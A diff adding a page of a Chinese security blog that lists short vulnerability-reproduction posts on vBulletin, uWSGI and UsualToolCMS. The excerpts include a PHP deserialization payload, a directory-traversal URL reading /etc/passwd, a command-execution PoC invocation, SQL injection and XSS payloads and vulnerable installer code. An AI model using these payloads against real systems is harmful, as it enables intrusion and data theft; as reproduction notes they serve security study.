@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/29/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-vBulletin/（CVE-2015-7808）VBulletin 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/vBulletin/%EF%BC%88CVE-2015-7808%EF%BC%89VBulletin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.454Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2015-7808）远程命令执行漏洞"><a href="#（CVE-2015-7808）远程命令执行漏洞" class="headerlink" title="（CVE-2015-7808）远程命令执行漏洞"></a>（CVE-2015-7808）远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>VBulletin VBulletin 5.1.4 - 5.1.9</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>$ php &lt;&lt; &#39;eof&#39;
+ &lt;?php
+ class vB_Database_MySQL&#123;
+        public $functions = array();
+
+        public function __construct() 
+        &#123;
+                $this-&gt;functions[&#39;free_result&#39;] = &#39;assert&#39;;
+        &#125;
+ &#125;
+
+ class vB_dB_Result &#123;
+        protected $db;
+        protected $recordset;
+
+        public function __construct()
+        &#123;
+                $this-&gt;db = new vB_Database_MySQL();
+                $this-&gt;recordset = &quot;phpinfo()&quot;;
+        &#125;
+ &#125;
+
+ print urlencode(serialize(new vB_dB_Result())) . &quot;n&quot;;
+ eof
+http://0-sec.org/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D
+</code></pre>
+<p>image</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/vBulletin/%EF%BC%88CVE-2015-7808%EF%BC%89VBulletin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/vBulletin/%EF%BC%88CVE-2015-7808%EF%BC%89VBulletin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxjc00key8v1218m4tf1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-uWSGI/（CVE-2018-7490）uWSGI PHP目录穿越漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/uWSGI/%EF%BC%88CVE-2018-7490%EF%BC%89uWSGI%20PHP%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.424Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-7490）uWSGI-PHP目录穿越漏洞"><a href="#（CVE-2018-7490）uWSGI-PHP目录穿越漏洞" class="headerlink" title="（CVE-2018-7490）uWSGI PHP目录穿越漏洞"></a>（CVE-2018-7490）uWSGI PHP目录穿越漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言。</p>
+<p>uWSGI<br>2.0.17之前的PHP插件，没有正确的处理<code>DOCUMENT_ROOT</code>检测，导致用户可以通过<code>..%2f</code>来跨越目录，读取或运行<code>DOCUMENT_ROOT</code>目录以外的文件。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>uWSGI &lt; 2.0.17</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>访问<code>http://www.0-sec.org:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd</code>，成功读取文件：</p>
+<p><img src="/resource/(CVE-2018-7490)uWSGIPHP%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/uWSGI/%EF%BC%88CVE-2018-7490%EF%BC%89uWSGI%20PHP%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/uWSGI/%EF%BC%88CVE-2018-7490%EF%BC%89uWSGI%20PHP%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxjd00kgy8v19v0ugsup" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-uWSGI/uWSGI 未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/uWSGI/uWSGI%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.421Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="uWSGI-未授权访问漏洞"><a href="#uWSGI-未授权访问漏洞" class="headerlink" title="uWSGI 未授权访问漏洞"></a>uWSGI 未授权访问漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言，通常被用于运行Python<br>WEB应用。uwsgi除了是应用容器的名称之外，它和Fastcgi之类的一样，也是前端server与后端应用容器之间的一个交流标准。目前nginx，apache也支持uwsgi协议进行代理转发请求。</p>
+<p>uWSGI支持通过魔术变量（Magic<br>Variables）的方式动态配置后端Web应用。如果其端口暴露在外，攻击者可以构造uwsgi数据包，并指定魔术变量<code>UWSGI_FILE</code>，运用<code>exec://</code>协议执行任意命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>使用poc.py，执行命令<code>python poc.py -u your-ip:8000 -c &quot;touch /tmp/success&quot;</code>：</p>
+<p><img src="/resource/uWSGI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>执行<code>docker-compose exec web bash</code>进入容器，可见<code>/tmp/success</code>已经成功执行：</p>
+<p><img src="/resource/uWSGI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/uWSGI/uWSGI%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/uWSGI/uWSGI%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxjb00kdy8v13tta1k3i" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-UsualToolcms/UsualToolCMS-8.0 a_templetex.php sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/UsualToolcms/UsualToolCMS-8.0%20a_templetex.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.225Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UsualToolCMS-8-0-a-templetex-php-sql注入漏洞"><a href="#UsualToolCMS-8-0-a-templetex-php-sql注入漏洞" class="headerlink" title="UsualToolCMS-8.0 a_templetex.php sql注入漏洞"></a>UsualToolCMS-8.0 a_templetex.php sql注入漏洞</h1><p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a_templetex.php?t=open&amp;id=1&amp;paths=templete/index&#x27; where id=1 and if(ascii(substring(user(),1,1))&gt;0,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>![image.png](/resource/UsualToolCMS-8.0%20a_templetex.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/1600850751098-fc38e94b-e10c-4844-bf78-9162a9fccd47.png)</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/UsualToolcms/UsualToolCMS-8.0%20a_templetex.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolCMS-8.0%20a_templetex.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxdp00k3y8v148mle5vh" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-UsualToolcms/UsualToolcms 8.0 绕过后台验证码爆破" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.223Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UsualToolcms-8-0-绕过后台验证码爆破"><a href="#UsualToolcms-8-0-绕过后台验证码爆破" class="headerlink" title="UsualToolcms 8.0 绕过后台验证码爆破"></a>UsualToolcms 8.0 绕过后台验证码爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>可通过删除验证码参数，进行暴力破解</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>UsualToolCMS-8.0-Release</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞点:<a target="_blank" rel="noopener" href="http://0-sec.org/cmsadmin/">http://0-sec.org/cmsadmin/</a></p>
+<p>后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功</p>
+<h3 id="1-默认情况下登陆数据包"><a href="#1-默认情况下登陆数据包" class="headerlink" title="1.默认情况下登陆数据包"></a>1.默认情况下登陆数据包</h3><p><img src="/resource/UsualToolcms8.0%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/media/rId26.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/" data-id="cl5c2qxdo00k0y8v16bn5cw5c" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-UsualToolcms/UsualToolcms 8.0 系统重装漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.220Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UsualToolcms-8-0-系统重装漏洞"><a href="#UsualToolcms-8-0-系统重装漏洞" class="headerlink" title="UsualToolcms 8.0 系统重装漏洞"></a>UsualToolcms 8.0 系统重装漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>无验证, 在安装cms完成后 并不会自动删除文件<br>又不会生成lock来判断是否安装过了。 导致了可以直接重装过 setup/index.php<br>安装地址</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>UsualToolCMS大众版5.0</p>
+<p>UsualToolcms 8.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>&lt;?php
+$t=$_GET[&quot;t&quot;];
+$l=$_GET[&quot;l&quot;];
+$dbcontent=file_get_contents(&quot;../sql_db.php&quot;);
+if($t==&quot;db&quot;)&#123;
+$sqlcontent=$_POST[&quot;sqlcontent&quot;];
+file_put_contents(&quot;../sql_db.php&quot;,$sqlcontent);
+echo &quot;&lt;script&gt;alert(&#39;数据库设置成功!&#39;);window.location.href=&#39;?l=sql&#39;&lt;/script&gt;&quot;;
+&#125;
+if($t==&quot;testdb&quot;)&#123;
+$dbhost=$_POST[&quot;dbhost&quot;];
+$dbname=$_POST[&quot;dbname&quot;];
+$dbuser=$_POST[&quot;dbuser&quot;];
+$dbpass=$_POST[&quot;dbpass&quot;];
+$mysqli=new mysqli($dbhost,$dbuser,$dbpass,$dbname);
+echo &quot;&lt;script&gt;alert(&#39;测试完成!&quot;.$mysqli-&gt;connect_error.&quot;&#39;);window.location.href=&#39;?l=sqlback&#39;&lt;/script&gt;&quot;;
+&#125;
+if($t==&quot;sqlback&quot;)&#123;
+include(&#39;../sql_db.php&#39;);
+$sqlcontent=$_POST[&#39;sqlcontent&#39;];
+$res=$mysqli -&gt; multi_query($sqlcontent);
+echo &quot;&lt;script&gt;alert(&#39;数据库结构规划完成!&#39;);window.location.href=&#39;?l=setup&#39;&lt;/script&gt;&quot;;
+&#125;
+if($t==&quot;update&quot;)&#123;
+include(&#39;../sql_db.php&#39;);
+$authcode=$_POST[&quot;authcode&quot;];$webname=$_POST[&quot;webname&quot;];
+$weblogo=$_POST[&quot;weblogo&quot;];
+$weburl=$_POST[&quot;weburl&quot;];
+$template=$_POST[&quot;template&quot;];
+$webisclose=$_POST[&quot;webisclose&quot;];
+$develop=$_POST[&quot;develop&quot;];
+$articlelistnum=$_POST[&quot;articlelistnum&quot;];
+$indexarticlenum=$_POST[&quot;indexarticlenum&quot;];
+$indexarticlerenum=$_POST[&quot;indexarticlerenum&quot;];
+$articlehitnum=$_POST[&quot;articlehitnum&quot;];
+$goodslistnum=$_POST[&quot;goodslistnum&quot;];
+$indexgoodsnum=$_POST[&quot;indexgoodsnum&quot;];
+$indexgoodsrenum=$_POST[&quot;indexgoodsrenum&quot;];
+$goodshitnum=$_POST[&quot;goodshitnum&quot;];
+$article=$_POST[&quot;article&quot;];
+$goods=$_POST[&quot;goods&quot;];
+$messagebook=$_POST[&quot;messagebook&quot;];
+$orders=$_POST[&quot;orders&quot;];
+$members=$_POST[&quot;members&quot;];
+$usercookname=$_POST[&quot;usercookname&quot;];
+$sqls=&quot;INSERT INTO `cms_setup` (authcode,webname,weblogo,weburl,template,webisclose,develop,articlelistnum,indexarticlenum, indexarticlerenum,articlehitnum,goodslistnum,indexgoodsnum,indexgoodsrenum,goodshitnum,article,goods,messagebook,orders,members,usercookname,installtime) VALUES (&#39;$authcode&#39;,&#39;$webname&#39;,&#39;$weblogo&#39;,&#39;$weburl&#39;,&#39;$template&#39;,&#39;$webisclose&#39;,&#39;$develop&#39;,&#39;$articlelistnum&#39;,&#39;$indexarticlenum&#39;,&#39;$indexarticlerenum&#39;,&#39;$articlehitnum&#39;,&#39;$goodslistnum&#39;,&#39;$indexgoodsnum&#39;,&#39;$indexgoodsrenum&#39;,&#39;$goodshitnum&#39;,&#39;$article&#39;,&#39;$goods&#39;,&#39;$messagebook&#39;,&#39;$orders&#39;,&#39;$members&#39;,&#39;$usercookname&#39;,now())&quot;;
+if ($mysqli-&gt;query($sqls) == TRUE) &#123;
+echo &quot;&lt;script&gt;alert(&#39;基础设置完成!&#39;);window.location.href=&#39;?l=welcome&#39;&lt;/script&gt;&quot;;
+&#125;else&#123;
+echo &quot;&lt;script&gt;alert(&#39;未设置成功!请重填!&#39;);window.location.href=&#39;?l=setup&#39;&lt;/script&gt;&quot;;
+&#125;
+&#125;?&gt;
+</code></pre>
+<p>UsualToolcsm需要先设置数据库账号密码才可以安装sql_db.php文件。</p>
+<p>这边是判断数据库连接是否成功，</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxdp00k2y8v19alm4983" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-UsualToolcms/UsualToolcms 8.0 后台反射型XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.218Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UsualToolcms-8-0-后台反射型XSS"><a href="#UsualToolcms-8-0-后台反射型XSS" class="headerlink" title="UsualToolcms 8.0 后台反射型XSS"></a>UsualToolcms 8.0 后台反射型XSS</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>UsualToolcms 8.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/media/rId24.png" alt="1.png"></p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>https://www.0-sec.org/cmsadmin/a_auth.php?do=update&amp;l=%22%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
+</code></pre>
+<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/media/rId26.png" alt="2.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/" data-id="cl5c2qxdo00jzy8v1hflr580n" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-UsualToolcms/UsualToolcms 8.0 后台GETSHELL" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0GETSHELL/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.214Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UsualToolcms-8-0-后台GETSHELL"><a href="#UsualToolcms-8-0-后台GETSHELL" class="headerlink" title="UsualToolcms 8.0 后台GETSHELL"></a>UsualToolcms 8.0 后台GETSHELL</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>UsualToolCMS-8.0-Release</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>洞点:<a target="_blank" rel="noopener" href="http://0-sec.org/cmsadmin/a_lang.php">http://0-sec.org/cmsadmin/a_lang.php</a></p>
+<p>13行未对$lg做判断</p>
+<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId25.png"></p>
+<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId26.png"></p>
+<p><img src="/resource/UsualToolcms8.0%E5%90%8E%E5%8F%B0GETSHELL/media/rId27.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0GETSHELL/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%90%8E%E5%8F%B0GETSHELL/" data-id="cl5c2qxdo00k1y8v1c0fohscl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-UsualToolcms/UsualToolcms 8.0 前台sql" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%89%8D%E5%8F%B0sql/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.212Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UsualToolcms-8-0-前台sql"><a href="#UsualToolcms-8-0-前台sql" class="headerlink" title="UsualToolcms 8.0 前台sql"></a>UsualToolcms 8.0 前台sql</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>search.php</p>
+<pre><code>$key=UsualToolCMS::sqlcheck($_GET[&quot;key&quot;]);
+$navname=&quot;search&quot;;
+require_once(dirname(__FILE__).&#39;/&#39;.&#39;mytop.php&#39;);
+//搜索记录
+if(!empty($key)):
+$asql=&quot;SELECT * FROM `cms_search` WHERE keyword =&#39;$key&#39;&quot;;
+$adata=mysqli_query($mysqli,$asql);
+if(mysqli_num_rows($adata)&gt;0):
+$mysqli-&gt;query(&quot;UPDATE `cms_search` SET `hit`=hit+1 WHERE keyword =&#39;$key&#39; and lang=&#39;$language&#39;&quot;);
+else:
+$mysqli-&gt;query(&quot;INSERT INTO `cms_search` (`lang`,`keyword`) VALUES (&#39;$language&#39;,&#39;$key&#39;)&quot;);
+</code></pre>
+<p>$key被sqlcheck函数过滤了，让我们看下这个函数</p>
+<pre><code>function sqlchecks($StrPost)&#123;
+$StrPost=str_replace(&quot;&#39;&quot;,&quot;’&quot;,$StrPost);
+$StrPost=str_replace(&#39;&quot;&#39;,&#39;“&#39;,$StrPost);
+$StrPost=str_replace(&quot;(&quot;,&quot;（&quot;,$StrPost);
+$StrPost=str_replace(&quot;)&quot;,&quot;）&quot;,$StrPost);
+$StrPost=str_replace(&quot;@&quot;,&quot;#&quot;,$StrPost);
+$StrPost=str_replace(&quot;/*&quot;,&quot;&quot;,$StrPost);
+$StrPost=str_replace(&quot;*/&quot;,&quot;&quot;,$StrPost);
+return $StrPost;
+&#125;
+</code></pre>
+<p>如果没有Url编码的话这里应该是不存在漏洞的了，仔细看上面的代码，数据库操作中还有一个$language,我们追踪下$language吧</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%89%8D%E5%8F%B0sql/#more">......</a>
+          </p>
+        
+      
+    </div>
